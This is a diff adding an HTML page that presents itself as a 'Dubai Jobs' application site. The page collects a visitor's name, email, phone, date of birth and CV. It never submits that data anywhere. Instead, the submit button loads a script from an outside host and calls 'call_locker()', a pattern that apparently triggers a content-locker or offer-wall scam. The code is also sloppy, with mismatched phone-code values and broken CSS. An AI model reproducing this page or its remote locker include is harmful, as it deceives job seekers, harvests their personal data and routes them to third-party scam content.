@@ -1,0 +1,555 @@
+<html lang="en">
+<head>
+   <meta charset="UTF-8">
+   <meta http-equiv="X-UA-Compatible" content="IE=edge">
+   <meta name="viewport" content="width=h, initial-scale=1.0">
+   <title></title>
+   <link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Roboto:wght@100&display=swap" rel="stylesheet">
+<link
+rel="stylesheet"
+href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css"
+/>
+   <style>
+      
+   *{
+      margin: 0; padding: 0; box-sizing: border-box;
+   }
+   header{
+      width: 100%; height: 100vh;
+      background-image: url(https://c4.wallpaperflare.com/wallpaper/460/214/494/city-dubai-cityscape-blue-wallpaper-preview.jpg);
+      background-size: cover;
+   }
+
+   nav{
+      width: 100%; height: 15vh;
+      background: rgba(0,0,0,0.2);
+      color: white; display: flex; justify-content: space-between;
+      align-items: center; text-transform: uppercase;
+
+   }
+   nav .logo{
+      width: 25%; text-align: center; color: white; font-size: 45px;
+      font-family: 'Roboto', sans-serif; 
+   }
+   
+   nav .menu{
+      width: 40%; font-size: 25px;
+      display: flex; justify-content: space-around;
+      font-family: 'Roboto', sans-serif;
+   }
+   nav .menu a{
+      width: 25%;
+      text-decoration: none; color: white;
+      font-weight: bold;
+   }
+
+   nav .menu a:first-child{
+      color:#00b894 ;
+   }
+
+   main{
+      width: 100%;
+      height: 85vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      text-align: center; color: white;
+   }  
+  
+   section h1{
+      margin: 30px 0 20px 0;
+      font-size: 55px;
+      font-weight: bold;
+      text-shadow: 2px 1px 5px black;
+      text-transform: uppercase;
+   }
+
+   section p{
+      font-weight: bold;
+      font-size: 25px;
+      color: #eee;
+      word-spacing: 2px;
+      margin-bottom: 25px;
+      text-shadow: 1px 1px 1px black;
+   }
+
+   section{
+
+   }
+   section h3{
+      font-size: 45px; font-weight: 200; letter-spacing: 3px;
+      text-shadow: 1px 1px 2px black;
+      font-family: 'Roboto', sans-serif;
+      font-weight: bold;
+      font: bold;
+   }
+   section h1{
+      font-weight: bold;
+      margin: 30px 0 20px 0;
+      font-size: 55px;
+      font: bold;
+      font-weight: 700px;
+      text-shadow: 2px 1px 5px black;
+      text-transform: uppercase;
+      font-family: 'Roboto', sans-serif;
+   }
+
+   section p{
+      font-size: 25px;
+      word-spacing: 2px;
+      margin-bottom: 25px;
+      font-weight: bold;
+      text-shadow: 1px 1px 1px black;
+   }
+
+   section a{
+      padding: 12px 30px;
+      border-radius: 4px;
+      outline: none;
+      text-transform: uppercase;
+      font-size: 17px;
+      font-weight: 500;
+      text-decoration: none;
+      letter-spacing: 1px;
+      transition: all .5s ease ;
+   }
+   section .btnone{
+    background:  #fff;
+    color: #000;
+   }
+   .btnone:hover{
+      background: #00b894;
+      color: white;
+   
+   }
+
+   .btntow:hover{
+      background: #fff;
+      color: #000;
+   }
+
+   section .btntow{
+      background: #00b894;
+      color: white;
+   }
+
+   .change_content::after{
+      content: '';
+      animation: changetext 10s infinite linear;
+      color: #c5f100;
+   }
+
+   @keyframes changetext{
+      0%{content: "Dubai";}
+      20%{content: "Abu Dhabi";}
+      35%{content: "Sharjah";}
+      60%{content: "Al Ain";}
+      80%{content: "Ajman";}
+      100%{content: "Ras Al Khaimah";}
+   }
+   
+main{
+      width: 100%; height: 100vh;
+      background-size: cover;
+      background-image: url(https://c4.wallpaperflare.com/wallpaper/460/214/494/city-dubai-cityscape-blue-wallpaper-preview.jpg);
+}
+
+.div1{
+   margin: 0;
+   padding: 0;
+   font-family: sans-serif;
+   background: #00b894;
+   width: 100% auto ;
+   padding: 40px;
+   position: relative;
+   top: 50%;
+   left: 50%;
+   transform: translate(-50%,-50%);
+   background: #191919;
+   text-align: center;
+   color: #fff;
+}
+.name{
+   border: 0;
+   background: none;
+   font-size: 25px;
+   font-family: Arial, Helvetica, sans-serif;
+   display: block;
+   margin-left: 20px auto;
+   text-align: center;
+   border: 2px solid #3498db;
+   width: 600px ;
+   line-height: 40px;
+   background-color: #fff;
+   color: #000;
+}
+.name1{
+width: 400px ;
+font-size: 20px;
+}
+.email{
+   border: 0;
+   background: none;
+   font-size: 25px;
+   font-family: Arial, Helvetica, sans-serif;
+   display: block;
+
+   text-align: center;
+   border: 2px solid #3498db;
+   width: 600px ;
+   line-height: 40px;
+   background-color: #fff;
+   color: #000;
+}
+.email1{
+   width: 400px ;
+   font-size: 20px;
+}
+
+.phone{
+   border: 0;
+   background: none;
+   font-size: 25px;
+   font-family: Arial, Helvetica, sans-serif;
+   display: block;
+
+   text-align: center;
+   border: 2px solid #3498db;
+   width: 600px ;
+   line-height: 40px;
+   background-color: #fff;
+   color: #000;
+}
+.phone1{
+   width: 400px ;
+   font-size: 20px;
+}
+
+.country{
+   border: 0;
+   background: none;
+   font-size: 25px;
+   font-family: Arial, Helvetica, sans-serif;
+   display: block;
+
+   text-align: center;
+   border: 2px solid #3498db;
+   width: 600px ;
+   line-height: 40px;
+   background-color: #fff;
+   color: #000;
+}
+
+.country1{
+   width: 400px ;
+   font-size: 20px;  
+}
+
+.gender{
+   border: 0;
+   background: none;
+   font-size: 25px;
+   font-family: Arial, Helvetica, sans-serif;
+   display: block;
+   padding-right: 200px;
+   text-align: center;
+   border: 2px solid #3498db;
+   width: 600px ;
+   line-height: 40px;
+   background-color: #fff;
+   color: #000;
+}
+
+.gender1{
+   width: 400px auto ;
+   font-size: 20px;  
+}
+
+.date{
+   border: 0;
+   background: none;
+   font-size: 25px;
+   font-family: Arial, Helvetica, sans-serif;
+   display: block;
+   padding-right: 200px;
+   text-align: center;
+   border: 2px solid #3498db;
+   width: 600px ;
+   line-height: 40px;
+   background-color: #fff;
+   color: #000;
+}
+.date1{
+   width: 400px auto ;
+   font-size: 20px;
+}
+
+.cv{
+   border: 0;
+   background: none;
+   font-size: 25px;
+   font-family: Arial, Helvetica, sans-serif;
+   display: block;
+   text-align: center;
+   border: 2px solid #3498db;
+   width: 600px ;
+   line-height: 40px;
+   background-color: #fff;
+   color: #000;
+}
+
+.cv1{
+   width: 400px auto ;
+   font-size: 20px; 
+}
+
+.coment{
+   border: 0;
+   background: none;
+   font-size: 45px;
+   font-weight: bold;
+   font-family: Arial, Helvetica, sans-serif;
+   display: block;
+   text-align: center;
+   border: 2px solid #3498db;
+   width: 600px ;
+   line-height: 40px;
+   background-color: #fff;
+   color: #000; 
+}
+
+.summit{
+   border: 0;
+   background: none;
+   font-size: 15px;
+   font-weight: bold;
+   font-family: Arial, Helvetica, sans-serif;
+   display: block;
+   text-align: center;
+   border: 3px solid #3498db;
+   width: 600px ;
+   line-height: 40px;
+   background-color: #00b894;
+   color: rgb(249, 249, 249);
+   border-radius: 7px;
+}
+
+/* mobile view */
+@media(max-width:768px){
+   section .main .serachbox .search{
+      width: 780%;
+   }
+   section .main .serachbox .icon{
+   width: 84%;
+  }
+}
+/* destop view */
+@media(min-width:1024pxpx){
+
+}
+/* tablet view */
+@media(min-width:768px) and (max-width:1023px){
+   
+}
+
+
+
+   </style>
+</head>
+<body>
+   <!-- header-->
+<header>
+   <nav>
+      <div class="logo"> <h1 class="animate__bounceIn">DUBAI JOBS </h1></div>
+      <div class="menu">
+         <a href="https://www.bayt.com/en/uae/" target="_blank">Home</a>
+         <a href="https://www.bayt.com/en/uae/jobs/search/" target="_blank">Find Job</a>
+         <a href="https://www.bayt.com/en/blog/" target="_blank">BLOGS</a>
+         <a href="https://www.bayt.com/en/cv-writing/?native_source=CVW-top-menu" target="_blank">cv service</a>
+      </div> 
+   </nav>
+      <main>
+         <section>
+            <h3> WELLCOME DUBAI</h3>
+            <h1>DUBAI  JOBS APPLY <span class="change_content"></span></h1>
+            <p>DUBAI IS A BEUTIFULL COUNTRY</p>
+            <a href="https://www.bayt.com/en/career-articles-and-guides/" target="_blank" class="btnone"> learn more</a>
+            <a href="https://www.bayt.com/en/register-j/" target="_blank" class="btntow"> singup here</a>
+         </section>
+      </main> 
+
+  
+   
+    <div class="div1">
+   <div class="name">
+  <label  for="user"> Name:</label>
+  <input class="name1" type="text" id="user" name="user" placeholder="User Name"></div>  <br>
+
+  <div class="email">
+  <label for="email"> Email:</label>
+  <input class="email1" type="email" id="email" name="username" placeholder="User mail" required> </div> <br>
+
+   <div class="phone">
+  <label for="phone" > Phone:</label>
+  <select name="code" id="code">
+    <option value="+880">+93</option>
+    <option value="+990">+374</option>
+    <option value="+110">+994</option>
+    <option value="+110">+973</option>
+    <option value="+110">+880</option>
+    <option value="+880">+975</option>
+    <option value="+990">+246</option>
+    <option value="+110">+673</option>
+    <option value="+110">+855</option>
+    <option value="+110">+86</option>
+    <option value="+880">+20</option>
+    <option value="+990">+995</option>
+    <option value="+110">+852</option>
+    <option value="+110">+91</option>
+    <option value="+110">+62</option>
+    <option value="+880">+98</option>
+    <option value="+990">+964</option>
+    <option value="+110">+972</option>
+    <option value="+110">+81</option>
+    <option value="+110">+962</option>
+    <option value="+880">+7</option>
+    <option value="+990">+850</option>
+    <option value="+110">+82</option>
+    <option value="+110">+965</option>
+    <option value="+110">+996</option>
+    <option value="+880">+856</option>
+    <option value="+990">+961</option>
+    <option value="+110">+853</option>
+    <option value="+110">+60</option>
+    <option value="+110">+960</option>
+    <option value="+880">+976</option>
+    <option value="+990">+991</option>
+    <option value="+110">+95</option>
+    <option value="+110">+977</option>
+    <option value="+110">+968</option>
+
+    <option value="+110">+92</option>
+    <option value="+110">+970</option>
+    <option value="+110">+63</option>
+    <option value="+110">+974</option>
+    <option value="+110">+7</option>
+    <option value="+110">+966</option>
+    <option value="+110">+65</option>
+    <option value="+110">+94</option>
+    <option value="+110">+963</option>
+    <option value="+110">+886</option>
+
+    <option value="+110">+992</option>
+    <option value="+110">+66</option>
+     
+    <option value="+110">+670</option>
+    <option value="+110">+993</option>
+    <option value="+110">+971</option>
+    <option value="+110">+998</option>
+    <option value="+110">+84</option>
+    <option value="+110">+967</option>
+    <option value="+110">+1</option>
+    <option value="+110">+2</option>
+    <option value="+110">+5</option>
+
+    <option value="+110">+43</option>
+    <option value="+110">+64</option>
+
+    <option value="+110">+32</option>
+  </select>
+<input class="phone1" type="phone" id="phone" name="phone" placeholder="123456789" required> </div>
+<br>
+
+<div class="country">
+<label for="country">country</label>
+<input class="country1" list="con">
+<datalist id="con">
+   <option value="Afghanistan"></option>
+   <option value="Armenia"></option>
+   <option value="Azerbaijan"></option>
+   <option value="	Bahrain"></option>
+   <option value="Bangladesh"></option>
+   <option value="Bhutan"></option>
+   <option value="Brunei"></option>
+   <option value="Burma"></option>
+   <option value="Cambodia"></option>
+   <option value="China"></option>
+   <option value="Cyprus"></option>
+   <option value="Georgia"></option>
+   <option value="	India"></option>
+   <option value="	Indonesia"></option>
+  <option value="Iran"></option>
+  <option value="india"></option>
+  <option value="Iraq"></option>
+
+  <option value="Israel"></option>
+   <option value="	Japan"></option>
+   <option value="	Jordan"></option>
+   <option value="Kazakhstan"></option>
+   <option value="Cambodia"></option>
+   <option value="Kuwait"></option>
+   <option value="	Lebanon"></option>
+   <option value="Malaysia"></option>
+   <option value="	Maldives"></option>
+   <option value="	Mongolia"></option>
+  <option value="Nepal"></option>
+  <option value="North Korea"></option>
+  <option value="Oman"></option>
+
+  <option value="	Pakistan"></option>
+   <option value="Palestine"></option>
+   <option value="Philippines"></option>
+   <option value="Qatar"></option>
+   <option value="Saudi Arabia"></option>
+   <option value="Singapore"></option>
+   <option value="South Korea"></option>
+   <option value="Sri Lanka"></option>
+   <option value="	Syria"></option>
+   <option value="	Tajikistan"></option>
+  <option value="Thailand"></option>
+  <option value="Turkey"></option>
+  <option value="Turkmenistan"></option>
+
+  <option value="United Arab Emirates"></option>
+  <option value="	Uzbekistan"></option>
+  <option value="	Tajikistan"></option>
+ <option value="Vietnam"></option>
+ <option value="Turkey"></option>
+ <option value="Yemen"></option>
+</datalist> </div><br>
+
+<div class="gender">
+Gender:
+<input class="gender1" type="radio" id="gnd1" name="gender"> 
+<label for="gender1">Male</label>
+<input type="radio" id="gnd1" name="gender">
+<label for="gnd2">Female</label> </div> <br>
+
+ <div class="date">
+ <label for="date">Date of Birth</label>
+ <input class="date1" type="date" id="date" name="dob"> </div> <br>
+ 
+ <div class="cv">
+ <label for="file"> UPLOAD YOUR CV:</label>
+ <input class="cv1" type="file" id="file" name="file"> </div> <br>
+ 
+
+ <div class="coment">
+ <textarea name="comment" id="" cols="30" rows="10"></textarea> </div>
+ <br>
+
+   <div class="summit"> 
+      <script type="text/javascript" src="https://filedenzu.com/script_include.php?id=1180197"></script>
+      <button" onclick="call_locker();">SUMMIY YOUR CV</button>
+      
+</div> 
+
+
+</div>
+</header>
+
+
+</body>
+</html>
